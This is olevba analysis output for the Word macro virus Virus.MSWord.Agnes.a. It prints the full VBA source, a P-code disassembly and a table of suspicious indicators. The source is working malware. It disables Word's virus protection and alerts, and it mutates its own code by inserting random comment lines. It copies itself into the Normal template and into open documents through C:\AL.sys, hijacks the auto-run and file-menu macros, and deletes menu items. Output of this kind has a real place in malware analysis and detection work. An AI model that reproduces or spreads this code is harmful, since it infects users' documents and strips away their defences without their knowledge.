olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Agnes.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Agnes.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO AL.bas 
in file: Virus.MSWord.Agnes.a - OLE stream: 'Macros/VBA/AL'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub RuLeQp9075()
On Error Resume Next
WordBasic.DisableAutoMacros 0
ActiveDocument.ReadOnlyRecommended = False
With Application
.EnableCancelKey = wdCancelDisabled
.DisplayAlerts = wdAlertsNone
End With
With Options
.ConfirmConversions = False
.VirusProtection = False
End With
Randomize
ActiveLines = Application.VBE.ActiveVBProject.VBComponents("AL").CodeModule.CountOfLines
If ActiveLines > 300 Then
With Application.VBE.ActiveVBProject.VBComponents("AL").CodeModule
For TheLine = 1 To .CountOfLines
If Left(.Lines(TheLine, 1), 3) = "Rem" Then .DeleteLines TheLine
Next TheLine
End With
Else
With Application.VBE.ActiveVBProject.VBComponents("AL").CodeModule
PolySize = Int(Rnd * 10)
For PolyMorphic = 1 To PolySize
PolyString = ""
PolyLines = .CountOfLines
RndLine = Int(Rnd * PolyLines) + 1
StringSize = Int(Rnd * 39) + 1
For SomeString = 1 To StringSize
PolyString = PolyString & Chr(65 + Int(Rnd * 22)) & Chr(122 - Int(Rnd * 22))
Next SomeString
.InsertLines RndLine, "Rem " & PolyString
Next PolyMorphic
End With
End If
If Day(Now()) = 10 Then
Application.Caption = "AGNES LEE"
End If
Application.CommandBars("View").Controls(6).Delete
Application.CommandBars("Format").Controls(12).Delete
Application.CommandBars("Tools").Controls(12).Delete
Application.CommandBars("Tools").Controls(13).Delete
End Sub
Sub Tl569()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
With Options
.SaveNormalPrompt = False
.VirusProtection = False
.ConfirmConversions = False
End With
Application.VBE.ActiveVBProject.VBComponents("AL").Export "C:\AL.sys"
With Dialogs(wdDialogFileSummaryInfo)
.Author = Chr(74) + Chr(97) + Chr(99) + Chr(107) + Chr(32) + Chr(84) + Chr(119) + Chr(111) + Chr(102) + Chr(108) + Chr(111) + Chr(119) + Chr(101) + Chr(114) + Chr(32) + Chr(45) + Chr(61) + Chr(91) + Chr(76) + Chr(105) + Chr(110) + Chr(101) + Chr(90) + Chr(101) + Chr(114) + Chr(216) + Chr(32) + Chr(86) + Chr(120) + Chr(32) + Chr(84) + Chr(101) + Chr(97) + Chr(109) + Chr(93) + Chr(61) + Chr(45)
.Comments = "WM97.AL" & Chr(32) + Chr(98) + Chr(121) + Chr(32) + Chr(76) + Chr(105) + Chr(77) + Chr(69) + Chr(32) + Chr(49) + Chr(46) + Chr(111)
.Keywords = "LiME ID: 18288-Tl-5699075-Lm.W"
.Execute
End With
For x = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(x).Name = "AL" Then RfEfVg8187VhPkUu569 = True
Next x
For y = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(y).Name = "AL" Then VlCjMk457RuLeQp9075 = True
Next y
If RfEfVg8187VhPkUu569 = True And VlCjMk457RuLeQp9075 = False Then Set TkErNq244PwQuUk36 = ActiveDocument.VBProject
If RfEfVg8187VhPkUu569 = False And VlCjMk457RuLeQp9075 = True Then Set TkErNq244PwQuUk36 = NormalTemplate.VBProject
If RfEfVg8187VhPkUu569 = True And VlCjMk457RuLeQp9075 = True Then GoTo Ende_
TkErNq244PwQuUk36.VBComponents.Import "C:\AL.sys"
If VlCjMk457RuLeQp9075 = False Then ActiveDocument.SaveAs (WordBasic.[FileName$]()), FileFormat:=wdFormatDocument
If RfEfVg8187VhPkUu569 = False Then NormalTemplate.Save
Ende_:
Call RuLeQp9075
End Sub
Rem ExKfKzQmJwLyTlNwAoKrVgBxNjMjKeNqCoRlMgUkCkKnHjEhItTrJtPpJsJwHrGmAvKsBnTfLvPoNo
Sub AutoOpen()
On Error Resume Next
Call Tl569
Call RuLeQp9075
Rem Gj
End Sub
Sub AutoExit()
On Error Resume Next
Call Tl569
Call RuLeQp9075
End Sub
Sub AutoNew()
Rem JhCeSoNtPfLxPmTpSwUnAvAqFqSwTrNeArUsFfMzUi
On Error Resume Next
Call Tl569
Call RuLeQp9075
End Sub
Sub AutoExec()
On Error Resume Next
Call Tl569
Call RuLeQp9075
End Sub
Sub DateiNeu()
On Error Resume Next
Dialogs(wdDialogFileNew).Show
Call Tl569
Call RuLeQp9075
End Sub
Sub DateiOffnen()
On Error Resume Next
Dialogs(wdDialogFileOpen).Show
Rem IgHmRoExKsFqGgTyAhQnLkEoDmMtFrFpFgJzOlKr
Call Tl569
Call RuLeQp9075
End Sub
Sub DateiSchliesen()
On Error Resume Next
Call Tl569
Call RuLeQp9075
WordBasic.FileClose dlg
End Sub
Sub DateiSpeichern()
On Error Resume Next
Call Tl569
Call RuLeQp9075
ActiveDocument.Save
End Sub
Sub DateiDrucken()
On Error Resume Next
Call Tl569
Rem DhTyJiQqRmPoUqEmEfVeIxPwToPhBqTiApCfDnPeRkEfBlFuAtBgBpShMwLiRkTxTqPzMoFz
Call RuLeQp9075
Dialogs(wdDialogFilePrint).Show
End Sub
Sub BearbeitenErsetzen()
On Error Resume Next
Call Tl569
Call RuLeQp9075
Dialogs(wdDialogEditReplace).Show
End Sub
Sub ExtrasRechtschreibung()
On Error Resume Next
Call Tl569
Call RuLeQp9075
If Options.CheckGrammarWithSpelling = True Then
ActiveDocument.CheckGrammar
Else
ActiveDocument.CheckSpelling
End If
End Sub
Sub ExtrasSilbentrennung()
On Error Resume Next
Call Tl569
Call RuLeQp9075
Dialogs(wdDialogsToolsHyphenation).Show
End Sub
Sub ExtrasOptionen()
On Error Resume Next
Call Tl569
Rem KeNlHoEmGxUhMePjKnJmCzQpExVn
Call RuLeQp9075
Rem TmMvMhJwDfRvUyBlEnBpLkPnJg
Dialogs(wdDialogToolsOptions).Show
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Agnes.a
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/AL - 8932 bytes
' Line #0:
' 	FuncDefn (Sub RuLeQp9075())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #3:
' 	LitVarSpecial (False)
' 	Ld ActiveDocument 
' 	MemSt ReadOnlyRecommended 
' Line #4:
' 	StartWithExpr 
' 	Ld Application 
' 	With 
' Line #5:
' 	Ld wdCancelDisabled 
' 	MemStWith EnableCancelKey 
' Line #6:
' 	Ld wdAlertsNone 
' 	MemStWith DisplayAlerts 
' Line #7:
' 	EndWith 
' Line #8:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #9:
' 	LitVarSpecial (False)
' 	MemStWith ConfirmConversions 
' Line #10:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #11:
' 	EndWith 
' Line #12:
' 	ArgsCall Read 0x0000 
' Line #13:
' 	LitStr 0x0002 "AL"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St ActiveLines 
' Line #14:
' 	Ld ActiveLines 
' 	LitDI2 0x012C 
' 	Gt 
' 	IfBlock 
' Line #15:
' 	StartWithExpr 
' 	LitStr 0x0002 "AL"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #16:
' 	StartForVariable 
' 	Ld TheLine 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	For 
' Line #17:
' 	Ld TheLine 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Lines 0x0002 
' 	LitDI2 0x0003 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 "Rem"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld TheLine 
' 	ArgsMemCallWith DeleteLines 0x0001 
' 	EndIf 
' Line #18:
' 	StartForVariable 
' 	Ld TheLine 
' 	EndForVariable 
' 	NextVar 
' Line #19:
' 	EndWith 
' Line #20:
' 	ElseBlock 
' Line #21:
' 	StartWithExpr 
' 	LitStr 0x0002 "AL"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #22:
' 	Ld Rnd 
' 	LitDI2 0x000A 
' 	Mul 
' 	FnInt 
' 	St PolySize 
' Line #23:
' 	StartForVariable 
' 	Ld PolyMorphic 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld PolySize 
' 	For 
' Line #24:
' 	LitStr 0x0000 ""
' 	St PolyString 
' Line #25:
' 	MemLdWith CountOfLines 
' 	St PolyLines 
' Line #26:
' 	Ld Rnd 
' 	Ld PolyLines 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St RndLine 
' Line #27:
' 	Ld Rnd 
' 	LitDI2 0x0027 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St StringSize 
' Line #28:
' 	StartForVariable 
' 	Ld SomeString 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld StringSize 
' 	For 
' Line #29:
' 	Ld PolyString 
' 	LitDI2 0x0041 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitDI2 0x007A 
' 	Ld Rnd 
' 	LitDI2 0x0016 
' 	Mul 
' 	FnInt 
' 	Sub 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St PolyString 
' Line #30:
' 	StartForVariable 
' 	Ld SomeString 
' 	EndForVariable 
' 	NextVar 
' Line #31:
' 	Ld RndLine 
' 	LitStr 0x0004 "Rem "
' 	Ld PolyString 
' 	Concat 
' 	ArgsMemCallWith InsertLines 0x0002 
' Line #32:
' 	StartForVariable 
' 	Ld PolyMorphic 
' 	EndForVariable 
' 	NextVar 
' Line #33:
' 	EndWith 
' Line #34:
' 	EndIfBlock 
' Line #35:
' 	ArgsLd Now 0x0000 
' 	ArgsLd Day 0x0001 
' 	LitDI2 0x000A 
' 	Eq 
' 	IfBlock 
' Line #36:
' 	LitStr 0x0009 "AGNES LEE"
' 	Ld Application 
' 	MemSt Caption 
' Line #37:
' 	EndIfBlock 
' Line #38:
' 	LitDI2 0x0006 
' 	LitStr 0x0004 "View"
' 	Ld Application 
' 	ArgsMemLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #39:
' 	LitDI2 0x000C 
' 	LitStr 0x0006 "Format"
' 	Ld Application 
' 	ArgsMemLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #40:
' 	LitDI2 0x000C 
' 	LitStr 0x0005 "Tools"
' 	Ld Application 
' 	ArgsMemLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #41:
' 	LitDI2 0x000D 
' 	LitStr 0x0005 "Tools"
' 	Ld Application 
' 	ArgsMemLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #42:
' 	EndSub 
' Line #43:
' 	FuncDefn (Sub Tl569())
' Line #44:
' 	OnError (Resume Next) 
' Line #45:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #46:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #47:
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' Line #48:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' Line #49:
' 	LitVarSpecial (False)
' 	MemStWith ConfirmConversions 
' Line #50:
' 	EndWith 
' Line #51:
' 	LitStr 0x0009 "C:\AL.sys"
' 	LitStr 0x0002 "AL"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #52:
' 	StartWithExpr 
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #53:
' 	LitDI2 0x004A 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006B 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0054 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0077 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0077 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x003D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005B 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x00D8 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0056 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0078 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0054 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x005D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x003D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	MemStWith Author 
' Line #54:
' 	LitStr 0x0007 "WM97.AL"
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0062 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0079 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0031 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Concat 
' 	MemStWith Comments 
' Line #55:
' 	LitStr 0x001E "LiME ID: 18288-Tl-5699075-Lm.W"
' 	MemStWith Keywords 
' Line #56:
' 	ArgsMemCallWith Execute 0x0000 
' Line #57:
' 	EndWith 
' Line #58:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #59:
' 	Ld x 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0002 "AL"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St RfEfVg8187VhPkUu569 
' 	EndIf 
' Line #60:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #61:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #62:
' 	Ld y 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0002 "AL"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St VlCjMk457RuLeQp9075 
' 	EndIf 
' Line #63:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	NextVar 
' Line #64:
' 	Ld RfEfVg8187VhPkUu569 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld VlCjMk457RuLeQp9075 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	Set TkErNq244PwQuUk36 
' 	EndIf 
' Line #65:
' 	Ld RfEfVg8187VhPkUu569 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld VlCjMk457RuLeQp9075 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	Set TkErNq244PwQuUk36 
' 	EndIf 
' Line #66:
' 	Ld RfEfVg8187VhPkUu569 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld VlCjMk457RuLeQp9075 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo Ende_ 
' 	EndIf 
' Line #67:
' 	LitStr 0x0009 "C:\AL.sys"
' 	Ld TkErNq244PwQuUk36 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #68:
' 	Ld VlCjMk457RuLeQp9075 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	Paren 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' 	EndIf 
' Line #69:
' 	Ld RfEfVg8187VhPkUu569 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #70:
' 	Label Ende_ 
' Line #71:
' 	ArgsCall (Call) RuLeQp9075 0x0000 
' Line #72:
' 	EndSub 
' Line #73:
' 	Rem 0x004F " ExKfKzQmJwLyTlNwAoKrVgBxNjMjKeNqCoRlMgUkCkKnHjEhItTrJtPpJsJwHrGmAvKsBnTfLvPoNo"
' Line #74:
' 	FuncDefn (Sub AutoOpen())
' Line #75:
' 	OnError (Resume Next) 
' Line #76:
' 	ArgsCall (Call) Tl569 0x0000 
' Line #77:
' 	ArgsCall (Call) RuLeQp9075 0x0000 
' Line #78:
' 	Rem 0x0003 " Gj"
' Line #79:
' 	EndSub 
' Line #80:
' 	FuncDefn (Sub AutoExit())
' Line #81:
' 	OnError (Resume Next) 
' Line #82:
' 	ArgsCall (Call) Tl569 0x0000 
' Line #83:
' 	ArgsCall (Call) RuLeQp9075 0x0000 
' Line #84:
' 	EndSub 
' Line #85:
' 	FuncDefn (Sub AutoNew())
' Line #86:
' 	Rem 0x002B " JhCeSoNtPfLxPmTpSwUnAvAqFqSwTrNeArUsFfMzUi"
' Line #87:
' 	OnError (Resume Next) 
' Line #88:
' 	ArgsCall (Call) Tl569 0x0000 
' Line #89:
' 	ArgsCall (Call) RuLeQp9075 0x0000 
' Line #90:
' 	EndSub 
' Line #91:
' 	FuncDefn (Sub AutoExec())
' Line #92:
' 	OnError (Resume Next) 
' Line #93:
' 	ArgsCall (Call) Tl569 0x0000 
' Line #94:
' 	ArgsCall (Call) RuLeQp9075 0x0000 
' Line #95:
' 	EndSub 
' Line #96:
' 	FuncDefn (Sub DateiNeu())
' Line #97:
' 	OnError (Resume Next) 
' Line #98:
' 	Ld wdDialogFileNew 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #99:
' 	ArgsCall (Call) Tl569 0x0000 
' Line #100:
' 	ArgsCall (Call) RuLeQp9075 0x0000 
' Line #101:
' 	EndSub 
' Line #102:
' 	FuncDefn (Sub DateiOffnen())
' Line #103:
' 	OnError (Resume Next) 
' Line #104:
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #105:
' 	Rem 0x0029 " IgHmRoExKsFqGgTyAhQnLkEoDmMtFrFpFgJzOlKr"
' Line #106:
' 	ArgsCall (Call) Tl569 0x0000 
' Line #107:
' 	ArgsCall (Call) RuLeQp9075 0x0000 
' Line #108:
' 	EndSub 
' Line #109:
' 	FuncDefn (Sub DateiSchliesen())
' Line #110:
' 	OnError (Resume Next) 
' Line #111:
' 	ArgsCall (Call) Tl569 0x0000 
' Line #112:
' 	ArgsCall (Call) RuLeQp9075 0x0000 
' Line #113:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileClose 0x0001 
' Line #114:
' 	EndSub 
' Line #115:
' 	FuncDefn (Sub DateiSpeichern())
' Line #116:
' 	OnError (Resume Next) 
' Line #117:
' 	ArgsCall (Call) Tl569 0x0000 
' Line #118:
' 	ArgsCall (Call) RuLeQp9075 0x0000 
' Line #119:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #120:
' 	EndSub 
' Line #121:
' 	FuncDefn (Sub DateiDrucken())
' Line #122:
' 	OnError (Resume Next) 
' Line #123:
' 	ArgsCall (Call) Tl569 0x0000 
' Line #124:
' 	Rem 0x0049 " DhTyJiQqRmPoUqEmEfVeIxPwToPhBqTiApCfDnPeRkEfBlFuAtBgBpShMwLiRkTxTqPzMoFz"
' Line #125:
' 	ArgsCall (Call) RuLeQp9075 0x0000 
' Line #126:
' 	Ld wdDialogFilePrint 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #127:
' 	EndSub 
' Line #128:
' 	FuncDefn (Sub BearbeitenErsetzen())
' Line #129:
' 	OnError (Resume Next) 
' Line #130:
' 	ArgsCall (Call) Tl569 0x0000 
' Line #131:
' 	ArgsCall (Call) RuLeQp9075 0x0000 
' Line #132:
' 	Ld wdDialogEditReplace 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #133:
' 	EndSub 
' Line #134:
' 	FuncDefn (Sub ExtrasRechtschreibung())
' Line #135:
' 	OnError (Resume Next) 
' Line #136:
' 	ArgsCall (Call) Tl569 0x0000 
' Line #137:
' 	ArgsCall (Call) RuLeQp9075 0x0000 
' Line #138:
' 	Ld Options 
' 	MemLd CheckGrammarWithSpelling 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #139:
' 	Ld ActiveDocument 
' 	ArgsMemCall CheckGrammar 0x0000 
' Line #140:
' 	ElseBlock 
' Line #141:
' 	Ld ActiveDocument 
' 	ArgsMemCall CheckSpelling 0x0000 
' Line #142:
' 	EndIfBlock 
' Line #143:
' 	EndSub 
' Line #144:
' 	FuncDefn (Sub ExtrasSilbentrennung())
' Line #145:
' 	OnError (Resume Next) 
' Line #146:
' 	ArgsCall (Call) Tl569 0x0000 
' Line #147:
' 	ArgsCall (Call) RuLeQp9075 0x0000 
' Line #148:
' 	Ld wdDialogsToolsHyphenation 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #149:
' 	EndSub 
' Line #150:
' 	FuncDefn (Sub ExtrasOptionen())
' Line #151:
' 	OnError (Resume Next) 
' Line #152:
' 	ArgsCall (Call) Tl569 0x0000 
' Line #153:
' 	Rem 0x001D " KeNlHoEmGxUhMePjKnJmCzQpExVn"
' Line #154:
' 	ArgsCall (Call) RuLeQp9075 0x0000 
' Line #155:
' 	Rem 0x001B " TmMvMhJwDfRvUyBlEnBpLkPnJg"
' Line #156:
' 	Ld wdDialogToolsOptions 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #157:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

